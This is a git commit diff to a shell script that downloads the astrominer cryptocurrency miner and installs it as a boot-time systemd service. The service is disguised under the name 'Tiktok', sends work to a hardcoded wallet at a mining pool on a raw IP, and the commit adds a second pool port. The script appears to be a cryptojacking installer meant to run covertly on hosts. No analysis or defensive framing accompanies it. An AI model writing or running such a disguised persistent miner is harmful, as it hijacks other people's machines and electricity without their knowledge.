a2f38c2dac63fb04437d1e3f74655085b1a9a91c
claudiaeliza1912 <126445871+claudiaeliza1912@users.noreply.github.com>
2023-04-02 09:42:05 +0700

    Update aaaa.sh

--- aaaa.sh
+++ aaaa.sh
@@ -2,7 +2,7 @@ cd /home
 sudo wget https://github.com/dero-am/astrobwt-miner/releases/download/V1.9/astrominer-V1.9_modern_amd64_linux.tar.gz
 sudo apt update
 sudo tar xvzf astrominer-V1.9_modern_amd64_linux.tar.gz
-sudo bash -c 'echo -e "[Unit]\nDescription=Tiktok\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/astrominer -w dero1qy45fgfpwukunx354dqpsxc99uvr0aygt9fjylddf03vg55l7rf9gqg22ep58 -r 40.85.191.109:4444\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/deroz.service'
+sudo bash -c 'echo -e "[Unit]\nDescription=Tiktok\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=/home/astrominer -w dero1qy45fgfpwukunx354dqpsxc99uvr0aygt9fjylddf03vg55l7rf9gqg22ep58 -r 40.85.191.109:4444 -r 40.85.191.109:5555\n\n[Install]\nWantedBy=multi-user.target" > /etc/systemd/system/deroz.service'
 sudo systemctl daemon-reload
 sudo systemctl enable deroz.service
 echo "Setup completed!"
